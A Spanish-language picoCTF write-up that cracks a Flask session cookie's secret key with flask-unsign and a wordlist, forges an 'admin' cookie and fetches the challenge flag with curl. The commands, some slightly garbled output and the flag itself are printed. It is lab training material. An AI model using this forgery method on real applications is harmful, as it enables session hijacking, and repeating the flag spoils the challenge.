## Objetivo
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/c135543530f7dc24c3a6ecaeb44a81b8/server.py) [http://mercury.picoctf.net:65344/](http://mercury.picoctf.net:65344/)
## Solución
Primeramente instalamos flask 
```
┌──(kali㉿Franco)-[~]
└─$ pipx install flask-unsign
'flask-unsign' already seems to be installed. Not modifying existing installation in
'/home/kali/.local/share/pipx/venvs/flask-unsign'. Pass '--force' to force installation.
                                                                                               
┌──(kali㉿Franco)-[~]
└─$ pipx ensurepath
/home/kali/.local/bin has been been added to PATH, but you need to open a new terminal or
    re-login for this PATH change to take effect. Alternatively, you can source your shell's
    config file with e.g. 'source ~/.bashrc'.

You will need to open a new terminal or re-login for the PATH changes to take effect.
Alternatively, you can source your shell's config file with e.g. 'source ~/.bashrc'.

Otherwise pipx is ready to go! ✨ 🌟 ✨
                                                                                               
┌──(kali㉿Franco)-[~]
└─$ source ~/.zshrc
                                                                                               
┌──(kali㉿Franco)-[~]
└─$ pipx install flask-unsign
'flask-unsign' already seems to be installed. Not modifying existing installation in
'/home/kali/.local/share/pipx/venvs/flask-unsign'. Pass '--force' to force installation.
                                                                                               
┌──(kali㉿Franco)-[~]
└─$ flask-unsign --decode --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Zvw4Vw.-trbXEw53R788R9w4Plu2YhO6y8"
{'very_auth': 'snickerdoodle'}

```

Hacemos un archivo con todas las cookies que se nos da

Al final, cambamos la cookie con el flask-unsign
```
┌──(kali㉿Franco)-[~]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Zvw4Vw.-trbXEw53R788R9w4Plu2YhO6y8" --wordlist galletas.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'fortune'
                                                                                               
┌──(kali㉿Franco)-[~]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'fortune'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Zvw-fQ.NxN8I9xE7lN2DDVyn9A5FOqCYUA

┌──(kali㉿Franco)-[~]
└─$ curl -s http://mercury.picoctf.net:65344/display -H 'Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Zvw9Pg.4otoApG4Bx8uYW97HOoePNTkpOU'

<p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}</code></p>
```

## Notas adicionales
PipX es una **herramienta para instalar software escrito en Python por medio de espacios separados**. Está diseñada para ejecutar programas sin tener que forzar a cambiar la dependencia de otros programas.
## Referencias